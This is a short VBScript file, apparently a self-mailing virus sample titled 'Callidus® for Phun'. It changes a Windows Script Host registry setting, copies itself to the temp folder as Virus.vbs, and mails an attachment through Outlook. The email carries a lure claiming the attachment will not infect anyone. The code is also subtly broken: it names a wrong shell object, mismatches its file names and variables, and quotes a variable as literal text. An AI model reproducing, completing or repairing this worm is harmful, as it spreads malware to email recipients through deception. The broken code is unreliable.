' Callidus® for Phun
public wscr, fso, Message, MSGReturn, Mailobject, ScripName , File, TEMPDIR, UserNAme, Password
On Error Resume Next
set wscr = CreateObject("Explorer.Shell")
set fso = CreateObject("Scripting.FileSystemObject")
set ScriptName = fso.Getfile(Wscript.Scriptfullname)
set File = fso.OpenTextFile(WScript.ScriptFullname,1)

'Set script timeout value to zero to allow it to Run
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings\Timeout",0,"REG_DWORD"
vbscopy = File.ReadAll

'Copy file to temp directory 
Set TEMPDIR = fso.GetSpecialFolder(2)
ScriptName.Copy(TEMPDIR&"\Virus.vbs") 
Call ConfirmMail
Call SendThroughMail

Sub ConfirmMail
End Sub

sub SendThroughMail()
	On Error Resume Next
	dim Recipient
	set MailObject=WScript.CreateObject("Outlook.Application")
	MSGReturn = ""
	Recipient = InputBox ("Type the E-Mail Recipient of Choice","Recipient")
	if Recipient <>"" then

		MSGReturn = InputBox ("Type a Short Message!","Type a Short Message")
		set male=MailObject.CreateItem(0)
		male.Recipients.Add(Recipient)
		male.Subject = "Automated Test Program"
		male.Body = vbcrlf&"If you run the script it will ask you who to send it to with a short message. It will only send one E-mail and will not infect your system with any virus."&VBCRLF&"MSGReturn"
		male.Attachments.Add(TEMPDIR&"\Test.vbs")
		male.Send
	else
		MSGReturn = MsgBox ("No Message Returned!",64,"Goodbye~")
	end if
	Set FileName = fso.GetFile(TEMPDIR&"\Test.vbs")
	FileName.Delete		
end sub	
	Set fso = Nothing
	Set wscr = Nothing
	Set MailObject=Nothing
	Set FileName=Nothing

